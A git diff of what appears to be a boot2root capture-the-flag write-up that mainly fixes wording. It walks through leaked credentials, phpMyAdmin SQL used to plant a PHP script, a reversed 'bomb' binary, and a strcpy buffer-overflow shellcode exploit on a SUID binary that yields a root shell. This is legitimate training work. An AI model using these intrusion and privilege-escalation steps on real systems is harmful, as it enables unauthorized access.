@@ -68,7 +68,7 @@ curl -sk https://192.168.0.6/forum/index.php?id=6 | egrep -o 'invalid user .* fr
 ```
 We also found a list of users at https://192.168.0.6/forum/index.php?mode=user
 
-After trying the password with different users, we were able to login as lmexard: `lmezard:!q\]Ej?*5K5cy*AJ`
+After trying the password with different users, we were able to login as lmezard: `lmezard:!q\]Ej?*5K5cy*AJ`
 
 In the user's profile page (https://192.168.0.6/forum/index.php?mode=user&action=edit_profile),
 we found an email address
@@ -76,17 +76,17 @@ we found an email address
 #### webmail
 
 We used the email found at the forum `laurie@borntosec.net` with the password we had `!q\]Ej?*5K5cy*AJ`
-to login to the webmail portal
+to login to the webmail portal.
 
 In the email with the subject `DB Access`, there were credentials to access databases, we used them to
-access phpmyadmin
+access phpmyadmin.
 
 #### phpmyadmin
 
 Logged in using this creds `root:Fg-'kKXBj87E:aJ$`. We were able to access the forum database and extract
 password hashes but we were unable to crack any of them.
 
-As we can execute sql queries bu browsing to https://192.168.0.6/phpmyadmin/server_sql.php,
+As we can execute sql queries by browsing to https://192.168.0.6/phpmyadmin/server_sql.php,
 we tried creating a php script on the web server. But we had to find writable directories first.
 
 We used the directories found after fuzzing `/forum`, and `templates_c` was writable.
@@ -134,7 +134,7 @@ target$ stty rows 53 columns 237
 
 ### www-data -> lmezard
 
-We found credentials at the home directory
+We found a file containing credentials for the user `lmezard` at `/home/LOOKATME`.
 
 ```
 $ cat /home/LOOKATME/password
@@ -142,20 +142,20 @@ lmezard:G!@M6f4Eatau{sF"
 ```
 ### lmezard -> laurie
 
-At lmezard's home directory there was a tar archive `fun`
+At lmezard's home directory there was a tar archive `fun`.
 
 ```
 $ file fun
 fun: POSIX tar archive (GNU)
 ```
 
-We downloaded `fun` archive to our machine and extracted it
+We downloaded and extracted it on our machine.
 
 ```
 $ ftp ftp://lmezard@192.168.0.6/fun
 $ tar xf fun
 ```
-The extracted folder `ft_fun` contained a lot of files with the extension `pcap`, one of these files contained the following `main()`
+The extracted folder `ft_fun` contained a lot of files with the extension `pcap`, one of these files contained the following `main()`.
 
 ```c
 int main() {
@@ -192,7 +192,8 @@ int main() {
 }
 ```
 
-To extract the password for `laurie` we created a script: extract_pass.sh
+To extract the password for `laurie` we had to reorder the files based on an index found at every file.
+to do that, we created a script: extract_pass.sh
 
 ```
 $ bash scripts/extract_pass.sh
@@ -201,7 +202,7 @@ $ bash scripts/extract_pass.sh
 
 ### laurie -> thor
 
-After login in as laurie, we downloaded `bomb` binary to our machine
+After login in as laurie, we copied the `bomb` binary to our machine to reverse it.
 
 ```
 $ scp laurie@192.168.0.6:bomb .
@@ -227,7 +228,7 @@ gdb-peda$ disas main
 
 1. phase_1
 
-`strings_not_equal` is called with two arguments, out input stored at `eax` and a string stored at `0x80497c0`
+`strings_not_equal` is called with two arguments, our input which is stored stored at `eax` and a string stored at `0x80497c0`.
 
 ```
 gdb-peda$ disas phase_1
@@ -238,7 +239,7 @@ gdb-peda$ disas phase_1
    ...
 ```
 
-When examining that address we found our first answer
+When examining that address we found our first answer.
 
 ```
 gdb-peda$ x/s 0x80497c0
@@ -247,7 +248,7 @@ gdb-peda$ x/s 0x80497c0
 
 2. phase_2
 
-This phase expects our input to have 6 numbers
+This phase expects our input to have 6 numbers.
 
 ```
 $gdb-peda$ disas phase_2
@@ -255,14 +256,16 @@ $gdb-peda$ disas phase_2
     0x08048b5b <+19>:    call   0x8048fd8 <read_six_numbers>
     ...
 ```
-Then it checks that the first number is 1, if not explode_bomb is called
+Then it checks that the first number is 1, if not `explode_bomb` is called and the program exits.
 ```
 0x08048b63 <+27>:    cmp    DWORD PTR [ebp-0x18],0x1
 0x08048b67 <+31>:    je     0x8048b6e <phase_2+38>
 0x08048b69 <+33>:    call   0x80494fc <explode_bomb>
 ```
-after that it enters a loop, and checks that the product of each number (esi+ebx*4-0x4) with the index
-of the next (ebx+0x1) equals the next number(esi+ebx*4); indexes start at 1
+after that it enters a loop, and checks that the product of each number `esi+ebx*4-0x4` with the index
+of the next `ebx+0x1` equals the next number `esi+ebx*4`.
+
+> Note: indexes start at 1
 
 ```
 0x08048b6e <+38>:    mov    ebx,0x1
@@ -283,7 +286,7 @@ The combination that satisfy this rule is the following
 
 3. phase_3
 
-This phase expects more than 2 arguments, or explode_bomb is called.
+This phase expects more than 2 arguments, or `explode_bomb` is called.
 ```
 $gdb-peda$ disas phase_3
     ...
@@ -296,12 +299,12 @@ $gdb-peda$ disas phase_3
     0x08048bc4 <+44>:    call   0x80494fc <explode_bomb>
     ...
 ```
-The expected input is (int, char, int) which can be seen in the format passed to sscanf
+The expected input is `"int char int"` which can be seen in the format passed to `sscanf`.
 ```
 gdb-peda$ x/s 0x80497de
 0x80497de:      "%d %c %d"
 ```
-The first int (ebp-0xc) in used to specify the address to jump to, possible values are 0 to 7
+The first int `ebp-0xc` controls the address to jump to, it has 8 possible values from 0 to 7.
 ```
 0x08048bd3 <+59>:    mov    eax,DWORD PTR [ebp-0xc]
 0x08048bd6 <+62>:    jmp    DWORD PTR [eax*4+0x80497e8]
@@ -381,7 +384,7 @@ gdb-peda$ x/3i *phase_3+247
 
 4. phase_4
 
-This phase takes one number greater that 0, and passes it to func4, the returned value is compared to 55.
+This phase takes one number greater that 0, and passes it to `func4`, the returned value is compared to 55.
 ```
 gdb-peda$ disas phase_4
     ...
@@ -400,7 +403,7 @@ gdb-peda$ disas phase_4
     ...
 ```
 
-func4 returns 1 if its argument is less or equal to 1; the argument is stored in ebx
+`func4` returns 1 if its argument `ebx` is less then or equal to 1.
 ```
     0x08048ca8 <+8>:     mov    ebx,DWORD PTR [ebp+0x8]
     0x08048cab <+11>:    cmp    ebx,0x1
@@ -410,7 +413,7 @@ func4 returns 1 if its argument is less or equal to 1; the argument is stored in
     ...
     0x08048cdd <+61>:    ret
 ```
-func4 is called with ebx-0x1 as argument and with ebx-0x2, and their return value are added together
+If it is greater than 1, then the function calls it self recursively with `ebx-0x1` then `ebx-0x2` as argument, and their return values are added together.
 ```
    0x08048cb3 <+19>:    lea    eax,[ebx-0x1]
    0x08048cb6 <+22>:    push   eax
@@ -424,13 +427,14 @@ func4 is called with ebx-0x1 as argument and with ebx-0x2, and their return valu
 
 ```
 This function calculates the fibonacci number at the index passed as argument.
-To get the index of the fibonacci number 55, we created fibo_seq.py, this script takes a number
-as argument and return its index at the fibonacci sequence.  
-The index of 55 is '9'.
+
+To get the index of the fibonacci number 55, we created `fibo_seq.py`, this script takes a number as argument and return its index at the fibonacci sequence.
+
+After running the script with 55 as argument, we got the number `9`.
 
 5. phase_5
 
-This phase expects a string of 6 charachters
+This phase expects a string of 6 charachters.
 ```
 gdb-peda$ disas phase_5
     0x08048d3b <+15>:    call   0x8049018 <string_length>
@@ -438,7 +442,7 @@ gdb-peda$ disas phase_5
     0x08048d43 <+23>:    cmp    eax,0x6
     0x08048d46 <+26>:    je     0x8048d4d <phase_5+33>
 ```
-For each character 'al' (al & 0xf) is used as index to get a character from 0x804b220
+For each character `al` (al & 0xf) is used as index to get a character from `0x804b220`.
 ```
     0x08048d57 <+43>:    mov    al,BYTE PTR [edx+ebx*1]
     0x08048d5a <+46>:    and    al,0xf
@@ -449,24 +453,24 @@ For each character 'al' (al & 0xf) is used as index to get a character from 0x80
     0x08048d66 <+58>:    cmp    edx,0x5
     0x08048d69 <+61>:    jle    0x8048d57 <phase_5+43>
 ```
-0x804b220 contains the following string
+`0x804b220` contains the following string.
 ```
 gdb-peda$ x/s 0x804b220
 0x804b220:      "isrveawhobpnutfg\260\001"
 ```
-after a string is generated, it compares it the string stored at 0x804980b
+After a string is generated, it compares it the string stored at `0x804980b`.
 ```
     0x08048d72 <+70>:    push   0x804980b
     0x08048d77 <+75>:    lea    eax,[ebp-0x8]
     0x08048d7a <+78>:    push   eax
     0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
 ```
-The value stored in 0x804980b is 'giants'
+The value stored in `0x804980b` is 'giants'.
 ```
 gdb-peda$ x/s 0x804980b
 0x804980b:      "giants"
 ```
-To solve this phase we created phase_5.py, we got 4 different solutions:
+To solve this phase we created phase_5.py, and we got 4 different solutions:
 
 ```
 opekma
@@ -477,15 +481,14 @@ opukmq
 
 6. phase_6
 
-Our input is expected to have 6 number
-
+This phase expects our input to have 6 numbers.
 ```
 gdb-peda$ disas phase_6
     ...
     0x08048db3 <+27>:    call   0x8048fd8 <read_six_numbers>
     ...
 ```
-For each number it checks that it is between 1 and 6
+For each number it checks that it is between 1 and 6.
 ```
    0x8048dc0 <phase_6+40>:      lea    eax,[ebp-0x18]
    0x8048dc3 <phase_6+43>:      mov    eax,DWORD PTR [eax+edi*4]
@@ -493,7 +496,7 @@ For each number it checks that it is between 1 and 6
    0x8048dc7 <phase_6+47>:      cmp    eax,0x5
    0x8048dca <phase_6+50>:      jbe    0x8048dd1 <phase_6+57>
 ```
-And it also check that there are no duplicates
+And it also check that there are no duplicates.
 ```
    0x8048dd1 <phase_6+57>:      lea    ebx,[edi+0x1]
    0x8048dd4 <phase_6+60>:      cmp    ebx,0x5
@@ -513,7 +516,7 @@ And it also check that there are no duplicates
    0x8048dfd <phase_6+101>:     cmp    edi,0x5
    0x8048e00 <phase_6+104>:     jle    0x8048dc0 <phase_6+40>
 ```
-For the next part we needed to go back to a previous instrcution, which puts an address into `ebp-0x34`
+For the next part we needed to go back to a previous instrcution, which puts an address into `ebp-0x34`.
 ```
    0x08048da4 <+12>:    mov    DWORD PTR [ebp-0x34],0x804b26c
 ```
@@ -533,8 +536,7 @@ gdb-peda$ x/3x 0x804b23c
 gdb-peda$ x/3x 0x804b230
 0x804b230 <node6>:      0x000001b0      0x00000006      0x00000000
 ```
-Here the address is stored into 'esi', and each number of our input is used as index to get
-the appropriate node and append it to an array (edx).
+Here the address is stored into `esi`, and each number of our input is used as index to get the appropriate node and append it to an array `edx`.
 ```
    0x08048e02 <+106>:   xor    edi,edi
    ...
@@ -554,7 +556,7 @@ the appropriate node and append it to an array (edx).
    0x08048e3f <+167>:   cmp    edi,0x5
    0x08048e42 <+170>:   jle    0x8048e10 <phase_6+120>
 ```
-For every node in the array (edx), its next pointer is modified to point to the node after it.
+For every node in the array `edx`, its next pointer is modified to point to the node after it.
 ```
    0x08048e4a <+178>:   mov    edi,0x1
    0x08048e4f <+183>:   lea    edx,[ebp-0x30]
@@ -565,7 +567,7 @@ For every node in the array (edx), its next pointer is modified to point to the 
    0x08048e5b <+195>:   cmp    edi,0x5
    0x08048e5e <+198>:   jle    0x8048e52 <phase_6+186>
 ```
-The last piece of code, check that the nodes are in a descending order, otherwise explode_bomb is called. 
+The last piece of code, check that the nodes are in a descending order, otherwise `explode_bomb` is called. 
 ```
    0x08048e70 <+216>:   mov    edx,DWORD PTR [esi+0x8]
    0x08048e73 <+219>:   mov    eax,DWORD PTR [esi]
@@ -614,14 +616,14 @@ phase_6
 4 2 6 3 1 5
 ```
 
-Based on this results we have 12 password combination, and the correct one is the following
+Based on this results we have 12 password combination, and the correct one is the following.
 
 ```
 Publicspeakingisveryeasy.126241207201b2149opekmq426135
 ```
 ### thor -> zaz
 
-We created `turtle-solve.py` and uses turtle python library with the instructions from the file 'turtle'.
+We created `turtle-solve.py` and used `turtle python library` with the instructions from the file 'turtle'.
 After execution, we got a drawing of the word `SLASH`, but it was not the password.
 
 The last line in the file says the following:
@@ -629,10 +631,9 @@ The last line in the file says the following:
 ...
 Can you digest the message? :)
 ```
-This clue indicates that the password would be the md5 hash of the word 'SLASH', because md5 is an abriviation
-of 'Message Digest 5' which is a hashing algorithm.
+This clue indicates that the password would be the `MD5` hash of the word 'SLASH', because `MD5` is an abriviation of `Message Digest 5`.
 
-We calculated the md5 hash, and got the password for the user zaz.
+We calculated the `MD5` hash, and got the password for the user zaz.
 ```
 $ echo -n SLASH | md5sum
 646da671ca01bb5d84dbb5fb2238dc8e  -
@@ -640,14 +641,14 @@ $ echo -n SLASH | md5sum
 
 ### zaz -> root
 
-`exploit_me` is being executed as `root` because it has `SUID` bit set. This binary takes an argument and print it to stdout
+`exploit_me` is being executed as `root` because it has `SUID` bit set. This binary takes an argument and print it to `STDOUT`.
 
 ```
 $ ./exploit_me HELLO1337
 HELLO1337
 ```
 
-This code uses strcpy() to copy argv[1] into a buffer allocated on stack
+This code uses `strcpy()` to copy `argv[1]` into a buffer allocated on the stack.
 ```
 (gdb) disas main
    ...
@@ -660,7 +661,7 @@ This code uses strcpy() to copy argv[1] into a buffer allocated on stack
    0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
    ...
 ```
-We were able to override the instruction pointer (eip) by the 4 bytes at the offset 140 of the argument.
+We were able to override the instruction pointer `eip` by the 4 bytes at the offset 140 of the argument.
 ```
 (gdb) r $(python -c 'print("A"*140+"BBBB")')
 ...
@@ -668,7 +669,8 @@ Program received signal SIGSEGV, Segmentation fault.
 0x42424242 in ?? ()
 ```
 Next, we injected a shellcode to get a shell, but first we needed to find its address.
-To do so. we sat a breakpoint before 'ret' instruction, and examined the stack
+
+To do so. we sat a breakpoint before `ret` instruction, and examined the stack.
 ```
 (gdb) b *main + 66
 Breakpoint 2 at 0x8048436
@@ -688,6 +690,7 @@ Our shellcode starts at the address `0xbffff6b5`.
 
 Now that we have all we need, we created shellcode.py to generate the payload for us.
 
+Once we ran the binary with our payload as argument we recieved a shell as the root user.
 ```
 $ ./exploit_me $(python shellcode.py)
 ���������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS���
@@ -696,4 +699,3 @@ $ ./exploit_me $(python shellcode.py)
 root
 # 
 ```
-Once we ran the binary with our payload as argument we recieved a shell as the root user.
